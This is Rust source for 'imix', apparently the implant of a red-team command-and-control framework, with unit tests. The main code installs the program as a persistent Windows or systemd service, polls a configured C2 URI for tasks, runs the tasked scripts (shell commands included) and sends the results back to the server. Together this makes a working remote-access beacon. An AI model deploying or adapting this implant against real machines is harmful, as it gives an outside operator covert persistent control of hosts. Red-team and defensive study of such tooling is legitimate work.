use std::collections::HashMap;
use std::fs::{File, OpenOptions};
use std::io::{BufReader, Write};
use std::path::Path;
use std::time::Instant;
use chrono::{DateTime, Utc};

use clap::{Command, arg};
use anyhow::{Result, Error};
use tokio::task;
use tokio::time::{Duration,sleep};
use imix::graphql::{GraphQLTask, self};
use eldritch::{eldritch_run};

async fn install(config_path: String) -> Result<(), imix::Error> {
    let config_file = File::open(config_path)?;
    let config: imix::Config = serde_json::from_reader(config_file)?;

    #[cfg(target_os = "windows")]
    return imix::windows::install(config).await;

    #[cfg(target_os = "linux")]
    if Path::new(imix::linux::SYSTEMD_DIR).is_dir() {
        return imix::linux::install(config).await;
    }

    unimplemented!("The current OS/Service Manager is not supported")
}

async fn handle_exec_tome(task: GraphQLTask) -> Result<(String,String)> {

    // Read a tome script
    let task_job = match task.job {
        Some(job) => job,
        None => todo!(),
    };

    let tome_name = task_job.tome.name;
    let tome_contents = task_job.tome.eldritch;

    // Execute a tome script
    let res = eldritch_run(tome_name, tome_contents);
    match res {
        Ok(tome_output) => Ok((tome_output, "".to_string())),
        Err(tome_error) => Ok(("".to_string(), tome_error.to_string())),
    }
}

async fn handle_exec_timeout_and_response(imix_config: imix::Config, task: graphql::GraphQLTask) -> Result<(), Error> {
    let start_time = Utc::now();

    // Tasks will be forcebly stopped after 1 week.
    let timeout_duration = Duration::from_secs(60*60*24*7); // 1 Week.

    // Define a future for our execution task
    let exec_future = handle_exec_tome(task.clone());

    // Execute that future with a timeout defined by the timeout argument.
    let tome_output = match tokio::time::timeout(timeout_duration, exec_future).await {
        Ok(res) => {
            match res {
                Ok(tome_result) => tome_result,
                Err(tome_error) => return Err(tome_error),
            }
        },
        // If our timeout timer has expired set the port state to timeout and return.
        Err(_timer_elapsed) => {
            return Err(anyhow::anyhow!("Eldritch timeout elapsed"));
        },
    };

    // Send task response
    let test_task_response = graphql::GraphQLSubmitTaskResultInput {
        task_id: task.id.clone(),
        exec_started_at: start_time,
        exec_finished_at: Some(Utc::now()),
        output: tome_output.0.clone(),
        error: tome_output.1.clone(),
    };

    let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();
    let submit_task_result = graphql::gql_post_task_result(cur_callback_uri, test_task_response).await;
    match submit_task_result {
        Ok(_) => Ok(()), // Currently no reason to save the task since it's the task we just answered.
        Err(error) => Err(error),
    }
}

// Async handler for port scanning.
async fn main_loop(config_path: String) -> Result<()> {
    let debug = true;
    let config_file = File::open(config_path)?;
    let reader = BufReader::new(config_file);
    let imix_config: imix::Config = serde_json::from_reader(reader)?;

    let mut all_exec_futures: HashMap<String, _> = HashMap::new();

    loop {
        // 0. Get loop start time
        let loop_start_time = Instant::now();


        // 1. Pull down new tasks
        // 1a) calculate callback uri
        let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();

        // 1b) Collect new tasks
        let new_tasks = match graphql::gql_claim_tasks(cur_callback_uri).await {
            Ok(tasks) => tasks,
            Err(error) => {
                if debug {
                    println!("main_loop: error claiming task\n{:?}", error)
                }
                continue;
            },
        };

        // 2. Start new tasks
        for task in new_tasks {
            let exec_with_timeout = handle_exec_timeout_and_response(imix_config.clone(), task.clone());
            match all_exec_futures.insert(task.clone().id, task::spawn(exec_with_timeout)) {
                Some(_old_task) => {
                    if debug {
                        println!("main_loop: error adding new task. Non-unique taskID\n");
                    }
                },
                None => {},
            }
        }


        // 3. Sleep till callback time
        //                                  time_to_wait          -         time_elapsed
        let time_to_sleep = imix_config.callback_config.interval - loop_start_time.elapsed().as_secs() ;
        tokio::time::sleep(std::time::Duration::new(time_to_sleep, 67812)).await;

        // Check status
        for exec_future in all_exec_futures.iter() {
            println!("{}: {:?}", exec_future.0, exec_future.1.is_finished());
        }
    }
}


pub fn main() -> Result<(), imix::Error> {
    let matches = Command::new("imix")
        .arg(
            arg!(
                -c --config <FILE> "Sets a custom config file"
            )
            .required(false)
        )
        .subcommand(
            Command::new("install")
                .about("Run in install mode")
                .arg(
                    arg!(
                        -c --config <FILE> "Sets a custom config file"
                    )
                    .required(true)
                )
        )
        .get_matches();


    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();


    match matches.subcommand() {
        Some(("install", args)) => {
            let config_path = args.value_of("config").unwrap();
            match runtime.block_on(
                install(String::from(config_path))
            ) {
                Ok(_response) => {},
                Err(_error) => {},
            }
        },
        _ => {},
    }

    if let Some(config_path) = matches.value_of("config") {
        match runtime.block_on(main_loop(config_path.to_string())) {
            Ok(_) => todo!(),
            Err(_) => todo!(),
        }
    }
    Ok(())
}



#[cfg(test)]
mod tests {
    use imix::{graphql::{GraphQLJob, GraphQLTome}, CallbackConfig, ServiceConfig, C2Config};
    use super::*;
    use httptest::{Server, Expectation, matchers::*, responders::*};

    #[test]
    fn imix_handle_exec_tome() {
        let test_tome_input = GraphQLTask{
            id: "e05463e0-d30f-4bdd-8d64-7b341896c6a4".to_string(),
            job: Some(GraphQLJob {
                id: "cc0704c5-6773-4be3-b952-4cfa5c3eb2c4".to_string(),
                name: "Test Exec".to_string(),
                tome: GraphQLTome {
                    id: "b41b554b-a67a-4c74-bcdc-bb5b80154061".to_string(),
                    name: "Shell execute".to_string(),
                    description: "Execute a command in the default system shell".to_string(),
                    parameters: None,
                    eldritch: r#"sys.shell("whoami")"#.to_string(),
                    files: [].to_vec(),
                },
                bundle: None,
            }),
        };


        let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();


        let result = runtime.block_on(handle_exec_tome(test_tome_input)).unwrap();

        let mut bool_res = false;
        assert_eq!(result.1, "".to_string());

        if cfg!(target_os = "linux") ||
        cfg!(target_os = "ios") ||
        cfg!(target_os = "android") ||
        cfg!(target_os = "freebsd") ||
        cfg!(target_os = "openbsd") ||
        cfg!(target_os = "netbsd") ||
        cfg!(target_os = "macos") {
            bool_res = result.0 == "runner\n" || result.0 == "root\n";
        }
        else if cfg!(target_os = "windows") {
            bool_res =  result.0.contains("runneradmin") || result.0.contains("Administrator");
        }

        assert_eq!(bool_res, true);

    }



    #[test]
    fn imix_handle_exec_timeout_and_respones() {

        // Define test task
        let test_tome_input = GraphQLTask{
            id: "e05463e0-d30f-4bdd-8d64-7b341896c6a4".to_string(),
            job: Some(GraphQLJob {
                id: "cc0704c5-6773-4be3-b952-4cfa5c3eb2c4".to_string(),
                name: "Test Exec".to_string(),
                tome: GraphQLTome {
                    id: "b41b554b-a67a-4c74-bcdc-bb5b80154061".to_string(),
                    name: "Shell execute".to_string(),
                    description: "Execute a command in the default system shell".to_string(),
                    parameters: None,
                    eldritch: r#"sys.shell("whoami")"#.to_string(),
                    files: [].to_vec(),
                },
                bundle: None,
            }),
        };

        // Define expected task output
        let expected_task_result = graphql::GraphQLSubmitTaskResultInput {
            task_id: test_tome_input.clone().id,
            exec_started_at: Utc::now(),
            exec_finished_at: None,
            output: "root\n".to_string(),
            error: "".to_string(),
        };

        // Define http server with expected JSON.
        let server = Server::run();
        server.expect(
            Expectation::matching(
                request::body(serde_json::to_string(&expected_task_result).unwrap())
            )
            .respond_with(status_code(200))
        );

        // Define test imix config
        let imix_config: imix::Config = imix::Config {
            target_name: "test1234".to_string(),
            target_forward_connect_ip: "127.0.0.1".to_string(),
            callback_config: CallbackConfig {
                interval: 3,
                jitter: 0,
                timeout: 5,
                c2_configs: [
                    C2Config {
                        uri: server.url("/graphql").to_string(),
                        priority: 0,
                    }
                ].to_vec(),
            },
            service_configs: [].to_vec(),
        };

        // Run our function
        let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();

        let task_future =  runtime.block_on(
            handle_exec_timeout_and_response(imix_config, test_tome_input)
        ).unwrap();

    }

}
